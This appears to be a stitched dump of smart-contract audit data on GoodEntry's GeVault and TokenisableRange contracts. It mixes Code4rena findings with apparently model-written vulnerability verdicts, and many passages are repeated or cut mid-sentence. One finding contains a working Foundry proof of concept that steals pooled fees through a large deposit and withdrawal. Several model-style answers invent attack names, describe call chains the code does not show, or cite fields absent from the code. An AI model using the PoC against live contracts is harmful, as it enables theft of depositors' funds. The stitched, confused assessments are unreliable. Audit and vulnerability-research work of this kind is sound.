halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

It calculates the available token balance and deposits it into the appropriate tick indexes based on the current tick index. Additionally, it emits a \"Rebalance\" event when the new tick index does not equal the old tick index.\n\nThe first step in evaluating whether this code is vulnerable is to check for any errors that could cause the Inaccurate Ratio Calculation and Comparison vulnerability.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

Specifically, if the `deposit` function fails to revoke the token allowance of the old external contract and grant it to the new one, then the new contract would not be able to perform the expected token operations. This is because token allowances are specific to an address; they are not automatically transferred when the associated contract reference is updated.\n\nTo confirm that this vulnerability exists, we can generate a PoC by creating a simple test case where the `deposit` function in the external contract (t) fails to revoke the token allowance of the old external contract and grant it to the new one. This can be done by setting up a testing environment with two contracts (token0, token1) and an external contract (t), where we deposit tokens into the external contract and then update the reference to another contract (lendingPool). If the `deposit` function in the external contract (t) does not properly handle the token approvals, then the new contract (lendingPool) would not be able to perform the expected token operations.\n\nTherefore, I believe that the given smart contract code is vulnerable to a type of attack called \"Token Allowance Takeover.\"",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

Here's my reasoning:\n\n1. **Yes, it is vulnerable**. The function `deposit()` allows users to deposit tokens into the liquidity pool, which will be minted as new LP tokens. However, there is a small vulnerability in the logic of how these LP tokens are minted and distributed.\n2. **Type of vulnerability:** \"Liquidity Provider Lockup\" attack. This type of attack involves manipulating the distribution of liquidity to liquidity providers to cause them to lock up their assets or lose out on rewards.\n3. **Reason for vulnerability:** The vulnerability arises from the fact that the smart contract code does not properly handle the case where a pool has only a small amount of initial liquidity (less than $1 in value). In this scenario, the `deposit()` function will mint new LP tokens based on the ratio of the current TVL to the initial liquidity. However, if the initial liquidity is very small (e.g., less than $1), then this ratio can be manipulated to cause an attacker to obtain more LP tokens than they should.\n\nTo exploit this vulnerability, an attacker could deposit a large amount of assets into the pool, causing the value of the TVL to increase. Once the second liquidity provider deposits into the pool, their new LP tokens will be minted based on the ratio of their deposited asset value to the current TVL. If the initial liquidity is very small (e.g., less than $1), then this ratio can cause their new LP tokens to be rounded down to zero, effectively causing them to lose out on rewards or even steal assets from other liquidity providers.\n\nTo patch this vulnerability, the smart contract code should be modified so that it properly handles the case where a pool has only a small amount of initial liquidity (less than $1 in value). This can likely be done by adding some additional checks to ensure that the ratio of the current TVL to the initial liquidity is not manipulated in ways that could cause an attacker to gain unfair advantages.",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL.

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL. Reason: Arithmetic over/underflow] testOraclePrice() \n```\n\nThis will cause calculation still overflow, even using the widely used WBTC/WETH pair \n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nConsider to change the scale down using the recommended value from uniswap v3 library:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\n\nor change the scale down similar to the one used inside library\n\n```diff\n  function poolMatchesOracle() public view returns (bool matches){\n    (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();\n    \n    uint decimals0 = token0.decimals();\n    uint decimals1 = token1.decimals();\n    uint priceX8 = 10**decimals0;\n    // Overflow if dont scale down the sqrtPrice before div 2*192\n-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;\n+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;\n    priceX8 = priceX8 / 10**decimals1;\n    uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));\n    if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;\n  }\n```\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",

This vulnerability occurs when the external data used by the smart contract for calculation is tampered with or manipulated in some way, potentially leading to incorrect results or unintended consequences. In this case, the oracle data used by the smart contract to calculate the price of the pool is obtained from a single external source, which may be vulnerable to manipulation or tampering.\n\nThe reason for the vulnerability is that the `poolMatchesOracle()` function relies on the accuracy and integrity of the oracle data to make decisions about whether the pool matches the price reported by the oracle. However, if the oracle data is incorrect or tampered with in some way, this could lead to unexpected outcomes for the users of the smart contract. For example, if the oracle reports a price that is significantly higher than the true market price, the smart contract may be more likely to enter positions that are not profitable or may even lead to losses for the users. Similarly, if the oracle reports a price that is significantly lower than the true market price, the smart contract may be less likely to enter positions that could potentially earn the users a profit.\n\nTo mitigate this vulnerability, the developers of the smart contract should consider implementing cross-validation between multiple reliable data sources, such as different oracles or decentralized exchange pools, to ensure that the obtained information is consistent and accurate before making calculations and decisions based on this data.

Therefore, there is a possibility that an attacker could exploit reentrancy by calling the `deposit` function from within a callback function of another contract, potentially leading to unintended behavior or even malicious actions.\n2. Uniswap V3 Protocol Vulnerability: The `UniswapV3Pool` contract is used in the `deposit` function, which could potentially lead to vulnerabilities in the Uniswap V3 protocol itself if not implemented correctly. For example, there could be a vulnerability in the Uniswap V3 pool's liquidity calculations that allows an attacker to manipulate the liquidity of the pool and cause undesired outcomes for future liquidity providers.\n3.

The vulnerability involves a deviation in the calculation of LP tokens that could result from the incorrect calculation of the ideal balance based on the current balances of the pool. However, the provided code does not calculate the ideal balance based on the current balances of the pool; it only calculates the ideal balance based on the total liquidity of the pool, which is not affected by any custom target prices that may be set for the pool.\n5. The provided code does not use `self.balances` to calculate the ideal balance, but instead uses a more accurate mechanism that takes into account the current balance and the custom target price of the pool. This approach ensures that the ideal balance is correctly calculated for all scenarios and avoids fee deviations.\n\nOverall, based on the provided vulnerability knowledge and smart contract code, I conclude that the smart contract is not vulnerable to the identified \"Incorrect calculation of ideal balance and fee deviations in liquidity pools with custom target prices",

Here's why:\n\nThe vulnerability arises from the use of an incorrect formula for calculating the amount of LP tokens minted when adding liquidity to a pool. The formula used in the code is `lpAmt = totalSupply() * newLiquidity / (liquidity + feeLiquidity)`, which assumes that the token amounts provided by liquidity providers are accurate and represent the true token balances of the pool. However, this assumption is not always valid, as liquidity providers may provide different proportions of tokens than what is actually in the pool.\n\nFor example, if a liquidity provider provides 10% of the total supply of Token A and 5% of the total supply of Token B to the pool, but only 9% of Token A and 4% of Token B are actually available in the pool, then the formula used in the code will result in an incorrect calculation of the LP tokens minted. This can lead to a situation where some liquidity providers receive more LP tokens than they would have if their token proportions were accurately represented.\n\nTo mitigate this vulnerability, it is recommended to enhance the token amount calculation mechanism while adding liquidity to a pool, similar to how it is handled in Uniswap V2 Router.

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

The reason for this vulnerability is that the code uses a single fee calculation method for all AMM curves, without considering the ideal balance for each curve.

However, it does not properly handle different AMM curves, such as the quadratic curve used in Uniswap. Instead, it simply applies a single fee calculation method to all types of AMM curves, which can lead to incorrect swap fees being applied.\n\nTo mitigate this vulnerability, developers should ensure that the swapping fees are calculated based on the appropriate pricing curve for each type of AMM.

If the expected balance is less than 1% worth of fees, the code does not add more liquidity to the Uniswap position.\n\nFurthermore, the code also checks for slippage by validating against the value of the tokens since token amounts can move widely. This check ensures that the added liquidity is sufficient and not too much, which would be a concern if different fee calculation approaches were used for different AMM curves without proper consideration.\n\nTherefore, I believe that the code is safe from the \"Applying Incorrect Fee Calculation Approaches to Different AMM Curves\" vulnerability.

Here's why:\n\n1. Division by zero error can occur when calculating `sqrtPriceX96`: This value should be multiplied by 2**96 before being divided by the liquidity to avoid a potential division by zero error.\n2.

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

The contract uses the `INonfungiblePositionManager` interface provided by Uniswap V3 to collect fees from the user and deposit them into the treasury.

The contract also uses the `safeIncreaseAllowance` function provided by the `ERC20` interface to increase the allowance of the tokens being used in the pool, which is a best practice for handling token transfers.\n3. The contract checks for slippage using the `addedValue` and `liquidityValue` variables, which are calculated based on the prices of the tokens in the pool. If the difference between these two values is greater than 5%, the transaction will be rejected. This check ensures that the user does not experience a large loss due to slippage when compounding their fees.\n4. The contract also uses the `require` statement to validate the condition of the transaction before proceeding, which adds an extra layer of security by checking for potential errors or unexpected behavior.\n\nIn conclusion, the given smart contract code appears to be well-written and secure against the described attack, as it uses various best practices and checks to ensure that the transaction is validated and executed safely.",

The reason for this is that the `swapTokensForExactETH` function is called within an `exactOutputSingle` function, which can potentially lead to recursive calls if the token transfer and approval functions are not properly checked.\n\nHere's a step-by-step breakdown of the vulnerability:\n\n1. The `swapTokensForExactETH` function is called within an `exactOutputSingle` function, which allows the contract to execute multiple calls in a single transaction.\n2. Within the `exactOutputSingle` function, the `amountInMax` and `path[1]` variables are passed as arguments to the `swapTokensForExactETH` function.\n3. The `swapTokensForExactETH` function then calls the `safeTransferFrom`, `safeApprove`, and `exactOutputSingle` functions on the `ogInAsset` ERC20 token contract, passing in the `amountInMax` and `path[1]` variables as arguments.\n4. The `exactOutputSingle` function within the `swapTokensForExactETH` function then calls the `safeTransferFrom`, `safeApprove`, and `withdraw` functions on the `weth` IWETH9 token contract, passing in the `amountOut` variable as an argument.\n5. The `withdraw` function within the `swapTokensForExactETH` function then calls the `acceptPayable` variable within the `weth` IWETH9 token contract, which is set to true by the `swapTokensForExactETH` function.\n6. This allows for a recursive call to the `swapTokensForExactETH` function, potentially leading to an unlimited number of calls and a reentrancy attack.\n\nTo mitigate this vulnerability, it is recommended to use a modifier that checks whether the contract has been called within the same transaction or not, as described in the [Solidity documentation](https://docs.soliditylang.org/en/v0.8.7/contracts.html#reentrancy).

An attacker could potentially provide malicious values for these parameters, which could lead to unexpected behavior or even a vulnerability.\n2. Unsafe use of `.safeTransferFrom()`: The `ogInAsset` object is first transferred from the caller's address to the contract's address using the `.safeTransferFrom()` function. However, this function does not perform any checks on the `amountInMax` parameter, which could potentially be manipulated by an attacker to transfer more tokens than intended.\n3. Unverified user interactions: The code uses the `ogInAsset` object to call the `safeApprove()` function, but it is not clear whether this function is properly validated against the caller's permissions. An attacker could potentially use this function to manipulate the contract's behavior or steal tokens from the contract's address.\n4.

However, if a malicious user sends an approval transaction with a large enough value, they can trigger a reentrancy attack by calling `ogInAsset.safeApprove()` again before the first transaction is mined. This will effectively reset the allowance for `ogInAsset` to a non-zero value, allowing the malicious user to transfer tokens from the contract without the owner's consent.\n\nTo fix this vulnerability, we would need to add reentrancy guards around the `safeApprove()` and `safeTransferFrom()` functions for `ogInAsset`. This could be done by adding a `guard` variable that is initially set to `false`, and then set to `true` during the execution of `swapTokensForExactETH()`.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in 